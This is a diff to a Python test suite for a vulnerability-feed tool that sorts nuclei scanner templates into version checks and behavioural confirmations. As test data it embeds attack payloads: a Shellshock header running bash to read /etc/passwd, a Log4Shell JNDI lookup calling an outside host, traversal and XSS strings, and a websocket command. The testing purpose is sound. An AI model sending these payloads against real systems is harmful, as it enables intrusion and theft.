@@ -6,6 +6,7 @@ match hard evidence (``match_policy.has_hard_evidence``), lifted it to fire, rec
 ``notify.template_hits``, which never looked at heat. A version-class hit is now recorded as ``version_only``: the version re-read, never a
 confirmation. Behavioural templates (a traversal that reads /etc/passwd, an exposed file, a request carrying a payload) are unchanged.
 """
+import os
 from unittest import mock
 
 import yaml
@@ -205,10 +206,184 @@ ssl:
         words: [tls10]
 """
 
+# --- the review's constructed misfilings (PR #384): each one demonstrates something, so each must stay behaviour ------------------
+
+SHELLSHOCK_UA = r"""
+id: cve-2014-6271
+info: {name: Shellshock in a CGI, severity: critical}
+http:
+  - method: GET
+    path: ["{{BaseURL}}/cgi-bin/status"]
+    headers:
+      User-Agent: "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
+    matchers:
+      - type: word
+        part: header
+        words: ["Apache/2.2"]
+"""
+
+LOG4SHELL_RAW = r"""
+id: cve-2021-44228
+info: {name: Log4Shell through the User-Agent, severity: critical}
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{interactsh-url}}
+        User-Agent: ${jndi:ldap://{{interactsh-url}}/a}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words: ["dns"]
+      - type: word
+        words: ["Apache Tomcat/9.0.1"]
+"""
+
+ACCEPT_LANGUAGE_TRAVERSAL = r"""
+id: cve-2099-0006
+info: {name: Locale file traversal, severity: high}
+http:
+  - method: GET
+    path: ["{{BaseURL}}/"]
+    headers:
+      Accept-Language: ../../../../etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex: ["root:.*:0:0:"]
+      - type: word
+        words: ["Acme 1.2.3"]
+"""
+
+XSS_WORD_OR = r"""
+id: cve-2099-0007
+info: {name: Reflected script, severity: medium}
+http:
+  - method: GET
+    path: ["{{BaseURL}}/"]
+    matchers:
+      - type: word
+        words: ["Mozilla/5.0 <script>alert(1)</script>"]
+"""
+
+EXTRACTOR_ONLY_BLOCK = r"""
+id: cve-2099-0008
+info: {name: Config disclosure, severity: high}
+http:
+  - method: GET
+    path: ["{{BaseURL}}/config.json"]
+    extractors:
+      - type: regex
+        regex: ['"db_password":"([^"]+)"']
+  - method: GET
+    path: ["{{BaseURL}}/readme.txt"]
+    extractors:
+      - type: regex
+        name: version
+        internal: true
+        group: 1
+        regex: ["Stable tag: ([0-9.]+)"]
+    matchers:
+      - type: dsl
+        dsl: ["compare_versions(version, '< 2.0')"]
+"""
+
+WEBSOCKET_BLOCK = r"""
+id: cve-2099-0009
+info: {name: Websocket command, severity: critical}
+websocket:
+  - address: "{{Scheme}}://{{Hostname}}"
+    inputs:
+      - data: '{"cmd":"id"}'
+    matchers:
+      - type: word
+        words: ["uid="]
+http:
+  - method: GET
+    path: ["{{BaseURL}}/"]
+    matchers:
+      - type: regex
+        regex: ['Acme/1\.2\.[0-3]']
+"""
+
+DSL_COMPARE_OR_DISCLOSURE = r"""
+id: cve-2099-0010
+info: {name: Hash disclosure, severity: high}
+http:
+  - method: GET
+    path: ["{{BaseURL}}/api/status"]
+    extractors:
+      - type: regex
+        name: version
+        internal: true
+        group: 1
+        regex: ['"version":"([0-9.]+)"']
+    matchers:
+      - type: dsl
+        dsl:
+          - "compare_versions(version, '< 2.0') || contains(body, '\"password_hash\"')"
+"""
+
+ADMIN_LIST_WITH_VERSION = r"""
+id: cve-2099-0011
+info: {name: Unauthenticated admin user list, severity: high}
+http:
+  - method: GET
+    path: ["{{BaseURL}}/api/v1/admin/users"]
+    extractors:
+      - type: regex
+        name: version
+        internal: true
+        group: 1
+        regex: ['X-Acme-Version: ([0-9.]+)']
+        part: header
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ['"role":"admin"']
+      - type: dsl
+        dsl: ["compare_versions(version, '< 3.1.0')"]
+"""
+
+FLOW_TEMPLATE = r"""
+id: cve-2099-0012
+info: {name: Flow, severity: high}
+flow: http(1) && http(2)
+http:
+  - method: GET
+    path: ["{{BaseURL}}/a"]
+    matchers:
+      - type: regex
+        regex: ['Acme/1\.2\.[0-3]']
+  - method: GET
+    path: ["{{BaseURL}}/b"]
+    matchers:
+      - type: regex
+        regex: ['Acme/1\.2\.[0-3]']
+"""
+
+FIXTURES = os.path.join(os.path.dirname(__file__), 'fixtures', 'nuclei_templates')
+
+
+def fixture(name):
+    with open(os.path.join(FIXTURES, name), encoding='utf-8') as handle:
+        return handle.read()
+
+
 VERSION = {'jquery version regex': JQUERY_VERSION_REGEX, 'wp plugin compare_versions': WP_PLUGIN_COMPARE_VERSIONS,
-           'apache server header': APACHE_HEADER_BANNER, 'openssh banner': OPENSSH_BANNER}
+           'apache server header': APACHE_HEADER_BANNER, 'openssh banner': OPENSSH_BANNER,
+           # real community templates (nuclei-templates @ eddca90) that only compare a version they read
+           'zimbra ZmSettings.js (CVE-2022-27924)': fixture('CVE-2022-27924.yaml'), 'teleport ping (CVE-2025-49825)': fixture('CVE-2025-49825.yaml'),
+           'ivanti welcome.cgi (CVE-2025-0282)': fixture('CVE-2025-0282.yaml'), 'n-central login (CVE-2026-86218)': fixture('CVE-2026-86218.yaml')}
 BEHAVIOR = {'apache traversal': APACHE_TRAVERSAL, 'exposed git config': GIT_CONFIG_EXPOSED, 'header payload with a version guard': HEADER_BYPASS_WITH_VERSION,
-            'version or marker': VERSION_OR_MARKER, 'ip disclosure': IP_DISCLOSURE, 'ssl': SSL_WEAK}
+            'version or marker': VERSION_OR_MARKER, 'ip disclosure': IP_DISCLOSURE, 'ssl': SSL_WEAK,
+            'user-agent xss (CVE-2017-4011, real)': fixture('CVE-2017-4011.yaml'), 'shellshock user-agent': SHELLSHOCK_UA,
+            'log4shell raw host and user-agent': LOG4SHELL_RAW, 'accept-language traversal': ACCEPT_LANGUAGE_TRAVERSAL,
+            'markup in a version word': XSS_WORD_OR, 'an extractor-only block': EXTRACTOR_ONLY_BLOCK, 'an unknown websocket block': WEBSOCKET_BLOCK,
+            'compare_versions or a disclosure': DSL_COMPARE_OR_DISCLOSURE, 'admin list and a version': ADMIN_LIST_WITH_VERSION,
+            'flow': FLOW_TEMPLATE}
 
 
 class ClassificationTests(SimpleTestCase):
@@ -219,6 +394,22 @@ class ClassificationTests(SimpleTestCase):
     def test_templates_that_show_the_flaw_stay_behaviour_class(self):
         for name, text in BEHAVIOR.items():
             self.assertEqual(templategen.template_evidence(text), templategen.BEHAVIOR_EVIDENCE, name)
+
+    def test_one_ordinary_change_turns_a_version_template_into_behaviour(self):
+        # the allowlist: each of these, applied to a version-class template, is something it does not positively recognise
+        base = JQUERY_VERSION_REGEX
+        for change in (('  - method: GET\n', '  - method: GET\n    headers:\n      User-Agent: "x\'><svg/onload=alert(1)>"\n'),
+                       ('  - method: GET\n', '  - method: GET\n    headers:\n      Host: evil.example\n'),
+                       ('  - method: GET\n', '  - method: GET\n    headers:\n      X-Forwarded-For: 127.0.0.1\n'),
+                       ('"{{BaseURL}}/js/jquery.min.js"', '"{{BaseURL}}/js/jquery.min.js?debug=1"'),
+                       ('      - type: status\n        status:\n          - 200', '      - type: status\n        status:\n          - 500'),
+                       ('      - type: status\n', '      - type: status\n        negative: true\n'),
+                       ('http:\n', 'flow: http(1)\nhttp:\n')):
+            self.assertIn(change[0], base)
+            self.assertEqual(templategen.template_evidence(base.replace(change[0], change[1], 1)), templategen.BEHAVIOR_EVIDENCE, change)
+        self.assertEqual(templategen.template_evidence(base.replace('  - method: GET\n', '  - method: GET\n    headers:\n'
+                                                                    '      User-Agent: Mozilla/5.0 (X11; Linux x86_64)\n', 1)),
+                         templategen.VERSION_EVIDENCE)  # an ordinary browser header is still a plain read
 
     def test_anything_unreadable_is_behaviour_so_a_genuine_hit_is_never_downgraded(self):
         for text in ('', 'not: [yaml', 'id: x', '- a list', None):
@@ -256,8 +447,8 @@ class TemplateHitTests(Fixture):
     def heat(self):
         return threat.match_heat(CVEMatch.objects.select_related('cve_entry', 'triage').get(pk=self.match.pk))
 
-    def run_test(self, text, hit):
-        outcome = [{'host': HOST, 'vulnerable': True, 'output': '{}', 'hit': hit}]
+    def run_test(self, text, hit, vulnerable=True):
+        outcome = [{'host': HOST, 'vulnerable': vulnerable, 'output': '{}' if vulnerable else '', **({'hit': hit} if vulnerable else {})}]
         with mock.patch('cveFeed.validation.resolve_template', return_value=('/templates/x.yaml', '')), \
                 mock.patch('cveFeed.validation.approved_template', return_value=(text, '')), \
                 mock.patch.object(templategen, '_run_template_with_retry', return_value=outcome), \
@@ -293,6 +484,32 @@ class TemplateHitTests(Fixture):
         self.assertEqual(result['vulnerable'], [HOST])
         self.assertEqual(send.call_count, 1)
         self.assertIn('template test confirmed 1 vulnerable host', send.call_args.args[0])
+
+    def test_the_real_user_agent_xss_template_stays_a_confirmed_hit(self):
+        # nuclei-templates CVE-2017-4011: a plain GET of / whose User-Agent carries the payload; the review found it filed as a version check
+        hit = {'template-id': 'CVE-2017-4011', 'host': f'https://{HOST}', 'matched-at': f'https://{HOST}', 'matcher-status': True, 'type': 'http',
+               'request': "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 ... Firefox/40.1';alert(/XSS/);//",
+               'response': "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nvar ua='Mozilla/5.0 ... Firefox/40.1';alert(/XSS/);//"}
+        result, send = self.run_test(fixture('CVE-2017-4011.yaml'), hit)
+        match = CVEMatch.objects.get(pk=self.match.pk)
+        self.assertEqual((match.template_result, self.heat()), ('vulnerable', FIRE))
+        self.assertEqual(Vulnerability.objects.filter(source='nuclei-cve').count(), 1)
+        self.assertEqual((result['vulnerable'], send.call_count), ([HOST], 1))
+
+    def test_another_testers_confirmation_survives_a_version_hit_and_a_miss(self):
+        CVEMatch.objects.filter(pk=self.match.pk).update(template_result='vulnerable', template_id='openvas:1.3.6.1.4.1.25623.1.0.117251')
+        self.assertEqual(self.heat(), FIRE)
+        self.run_test(JQUERY_VERSION_REGEX, VERSION_HIT)
+        match = CVEMatch.objects.get(pk=self.match.pk)
+        self.assertEqual((match.template_result, match.template_id[:8], self.heat()), ('vulnerable', 'openvas:', FIRE))
+        self.run_test(APACHE_TRAVERSAL, None, vulnerable=False)
+        match = CVEMatch.objects.get(pk=self.match.pk)
+        self.assertEqual((match.template_result, match.template_id[:8], self.heat()), ('vulnerable', 'openvas:', FIRE))
+
+    def test_a_version_hit_never_lowers_a_behavioural_templates_confirmation(self):
+        self.run_test(APACHE_TRAVERSAL, TRAVERSAL_HIT)
+        self.run_test(JQUERY_VERSION_REGEX, VERSION_HIT)
+        self.assertEqual((CVEMatch.objects.get(pk=self.match.pk).template_result, self.heat()), ('vulnerable', FIRE))
 
     def test_the_validation_check_reads_a_version_hit_as_a_re_read_version(self):
         check = {'kind': 'nuclei_template', 'label': 'nuclei template for CVE-2020-11023', 'display': 'nuclei -t x', 'target': HOST,
